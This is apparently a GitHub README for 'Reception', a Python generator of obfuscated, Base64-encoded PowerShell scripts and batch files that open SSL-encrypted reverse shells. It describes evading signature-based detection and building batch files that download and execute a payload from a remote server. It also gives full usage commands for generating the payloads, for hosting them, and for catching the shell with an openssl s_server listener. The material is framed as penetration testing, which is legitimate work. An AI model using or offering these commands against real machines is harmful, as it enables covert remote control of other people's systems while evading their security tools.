# Reception: Reverse Shell Generator with SSL Encryption

## Overview

**Reverse** is a Python-based tool designed to generate obfuscated PowerShell scripts or batch files for establishing a reverse shell with SSL encryption. This tool can help in penetration testing scenarios where the goal is to bypass security mechanisms and establish a secure connection to a target machine.

## Features

- **Reverse Shell with SSL Encryption:** Generates PowerShell scripts that establish an encrypted reverse shell connection using SSL.
- **Obfuscation:** Each generated PowerShell script uses randomly selected variable names to avoid signature-based detection by security tools.
- **Base64 Encoding:** The PowerShell scripts are encoded in Base64 for additional obfuscation.
- **Batch File Generation:** Create a batch file that downloads and executes the encoded PowerShell script directly from a remote server.
- **Customizable:** Users can specify the IP address, port, and server URL for downloading the PowerShell script.

### Prerequisites

- Python 3.x
- OpenSSL (for certificate generation)

### Installation

Clone the repository:

```bash
git clone https://github.com/ShkudW/Reception.git
cd Reception
```

## Usage

Generate an Encoded PowerShell Script:
```bash
python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type ps1
```

Generate a Batch File and PowerShell Script:
```bash
python3 Reverser.py -ip <Your_Listener_Server_IP> -port <Your_Listener_Server_PORT> -type bat -server http://<Your_Server_ip|URL>/<File-Name>.ps1
```

Open a listener for downloadingg the PS1 file with listener.py:
```bash
python3 listener.py -port <Your_Server_PORT>
```

Open a listener for getting Reverse-Shell with OpenSSL:
```bash
openssl s_server -accept <Your_Listener_Port> -cert reception.pem -key reception.key -quiet
```

## PoC:
Generate a Batch File and PowerShell Script:

![image](https://github.com/user-attachments/assets/cfa697dc-46dc-4590-a05a-0cb0f09b1f8f)


Running the BAT file and creating a secure connection to the listener:

![image](https://github.com/user-attachments/assets/b7e05932-eeee-424f-905a-cb79481d1e2e)

Getting a Secure Reverse Shell:

![image](https://github.com/user-attachments/assets/254b55c2-4b83-4792-8901-95504c9a7fba)

Our Web Server with the PS1 file:

![image](https://github.com/user-attachments/assets/9d798ae3-fb11-4354-9ca1-c3c1343a1587)




